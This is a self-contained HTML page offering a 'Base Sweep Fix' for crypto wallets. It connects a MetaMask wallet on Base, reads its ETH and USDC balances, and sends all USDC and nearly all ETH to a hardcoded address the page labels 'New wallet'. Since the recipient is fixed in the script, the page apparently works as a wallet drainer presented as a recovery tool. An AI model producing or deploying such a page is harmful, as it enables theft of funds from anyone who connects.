<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Base Sweep Fix (Low Gas)</title>
<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
<style>
  body{font-family:system-ui;background:#0f172a;color:#e2e8f0;padding:20px;text-align:center;}
  .box{max-width:600px;margin:40px auto;background:#1e293b;padding:40px;border-radius:20px;box-shadow:0 20px 50px #0004;}
  h1{color:#60a5fa;}
  button{padding:16px 36px;margin:15px;font-size:19px;border:none;border-radius:12px;cursor:pointer;color:white;font-weight:bold;}
  .btn-connect{background:#3b82f6;}
  .btn-sweep{background:#10b981;}
  .addr{background:#334155;padding:14px;border-radius:10px;font-family:monospace;margin:20px 0;word-break:break-all;}
  #log{margin-top:25px;padding:20px;background:#334155;border-radius:12px;text-align:left;white-space:pre-wrap;display:none;font-family:monospace;font-size:15px;}
  #balances{display:inline-block;margin:10px;padding:10px;background:#475569;border-radius:8px;}
  .success{background:#166534;color:#86efac;}
  .error{background:#7f1d1d;color:#fca5a5;}
  .warning{background:#92400e;color:#f59e0b;}
</style>
</head>
<body>

<div class="box">
  <h1>Base Sweep Fix</h1>
  <p>Add 0.001 ETH gas → connect → sweep ETH + USDC</p>
  
  <button class="btn-connect" onclick="connect()">Connect Old Wallet (Base)</button>

  <div id="main" style="display:none;margin-top:30px;">
    <p><strong>Old wallet:</strong><br><span class="addr" id="oldAddr"></span></p>
    <p><strong>New wallet:</strong><br><span class="addr">0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f</span></p>
    <div>
      <p><strong>ETH Balance: <span id="ethBalance">0</span></strong></p>
      <p><strong>USDC Balance: <span id="usdcBalance">0</span></strong></p>
    </div>

    <button class="btn-sweep" onclick="sweepNow()">Sweep ETH + USDC Now</button>

    <div id="log"></div>
  </div>
</div>

<script>
// Base settings
const NEW_WALLET = "0xcde71a94923dd426910ce9beb8e1d1c3eb11cd2f";
const USDC_ADDR = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Native USDC on Base
let web3, oldAddress;

const ERC20_ABI = [{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"}];

async function connect() {
  if (!window.ethereum) return alert("Install MetaMask");
  web3 = new Web3(window.ethereum);
  await ethereum.request({method:'eth_requestAccounts'});
  const chainId = await web3.eth.getChainId();
  if (chainId !== 8453) {
    alert("Switch to Base");
    try { await ethereum.request({method: "wallet_switchEthereumChain", params:[{chainId: "0x2105"}]}); }
    catch { return; }
  }
  [oldAddress] = await web3.eth.getAccounts();
  document.getElementById('oldAddr').textContent = oldAddress;
  document.getElementById('main').style.display = 'block';
  updateBalances();
}

async function updateBalances() {
  if (!oldAddress) return;
  // ETH
  const ethBalWei = await web3.eth.getBalance(oldAddress);
  const ethBal = web3.utils.fromWei(ethBalWei, 'ether');
  document.getElementById('ethBalance').textContent = `${parseFloat(ethBal).toFixed(6)} ETH`;
  
  // USDC
  const usdc = new web3.eth.Contract(ERC20_ABI, USDC_ADDR);
  const decimals = await usdc.methods.decimals().call();
  const usdcBalWei = await usdc.methods.balanceOf(oldAddress).call();
  const usdcBal = (usdcBalWei / (10 ** decimals)).toFixed(2);
  document.getElementById('usdcBalance').textContent = `${usdcBal} USDC`;
}

async function sweepNow() {
  const ethBal = parseFloat(document.getElementById('ethBalance').textContent);
  if (ethBal < 0.0001) {
    return alert("Add more ETH for gas! Need ~0.0002+ ETH.");
  }
  if (!confirm("Sweep all to new wallet?")) return;
  
  const log = document.getElementById('log');
  log.style.display = 'block'; log.className = 'warning'; log.textContent = "Sweeping...\n";

  const usdc = new web3.eth.Contract(ERC20_ABI, USDC_ADDR);
  try {
    // USDC first
    const usdcBalWei = await usdc.methods.balanceOf(oldAddress).call();
    if (usdcBalWei > 0) {
      await usdc.methods.transfer(NEW_WALLET, usdcBalWei).send({from: oldAddress});
      log.textContent += "USDC swept!\n";
    }

    // ETH (leave 0.0001 reserve)
    const ethBalWei = await web3.eth.getBalance(oldAddress);
    const reserve = web3.utils.toWei('0.0001', 'ether');
    const toSend = ethBalWei - reserve;
    if (toSend > 0) {
      await web3.eth.sendTransaction({from: oldAddress, to: NEW_WALLET, value: toSend});
      log.textContent += `ETH swept (${web3.utils.fromWei(toSend, 'ether')} ETH)!\n`;
    }

    log.textContent += "\nSuccess! Check new wallet on Basescan.";
    log.className = 'success';
    updateBalances();
  } catch (e) {
    log.className = 'error';
    log.textContent += "Error: " + e.message + "\nTry adding more gas.";
  }
}
</script>
</body>
</html>